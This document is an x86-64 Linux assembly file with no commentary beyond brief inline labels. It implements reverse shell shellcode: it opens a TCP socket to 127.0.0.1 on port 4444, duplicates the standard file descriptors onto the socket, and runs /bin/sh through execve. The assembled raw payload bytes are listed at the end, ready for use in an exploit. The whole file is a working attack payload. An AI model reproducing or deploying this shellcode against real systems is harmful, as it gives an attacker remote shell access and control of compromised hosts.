global _start

_start:

mov rbp, rsp

xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
xor r10, r10

;struct sockaddr_in
sub rsp, 0x40
mov QWORD [rbp-0x28], 0x0
mov DWORD [rbp-0x2c], 0x0100007f ;127.0.0.1 IP address network byte
mov WORD [rbp-0x2e], 0x5c11 ; port
mov WORd [rbp-0x30], 0x2 ; AF_INET

;create socket
xor rax, rax
mov al, 0x29
mov di, 0x2
mov si, 0x1
syscall
mov QWORD [rbp-0x10], rax ;rbx is socket file descriptor

;connect
xor rax, rax
mov al, 0x2a
mov rdi, QWORD [rbp-0x10]
lea rsi, [rbp-0x30]
mov rdx, 0x10
syscall

;dup2
mov r12, 0x3
dup2:
dec r12
xor rax, rax
mov al, 0x21
mov rdi, QWORD [rbp-0x10]
mov rsi, r12
syscall
test r12, r12
jne dup2

;execve
mov DWORD [rbp-0x20], 0x6e69622f
mov DWORD [rbp-0x1c], 0x0068732f
xor rax, rax
mov al, 0x3b
lea rdi, [rbp-0x20]
xor rsi, rsi
xor rdx, rdx
syscall

xor rax, rax
mov al, 0x3c
xor rdi, rdi
syscall

;Raw bytes
;\x48\x89\xE5\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x4D\x31\xD2\x48\x83
;\xEC\x40\x48\xC7\x45\xD8\x00\x00\x00\x00\xC7\x45\xD4\x7F\x00\x00\x01
;\x66\xC7\x45\xD2\x11\x5C\x66\xC7\x45\xD0\x02\x00\x48\x31\xC0\xB0\x29
;\x66\xBF\x02\x00\x66\xBE\x01\x00\x0F\x05\x48\x89\x45\xF0\x48\x31\xC0
;\xB0\x2A\x48\x8B\x7D\xF0\x48\x8D\x75\xD0\x48\xC7\xC2\x10\x00\x00\x00
;\x0F\x05\x49\xC7\xC4\x03\x00\x00\x00\x49\xFF\xCC\x48\x31\xC0\xB0\x21
;\x48\x8B\x7D\xF0\x4C\x89\xE6\x0F\x05\x4D\x85\xE4\x75\xEA\xC7\x45\xE0
;\x2F\x62\x69\x6E\xC7\x45\xE4\x2F\x73\x68\x00\x48\x31\xC0\xB0\x3B\x48
;\x8D\x7D\xE0\x48\x31\xF6\x48\x31\xD2\x0F\x05\x48\x31\xC0\xB0\x3C\x48
;\x31\xFF\x0F\x05






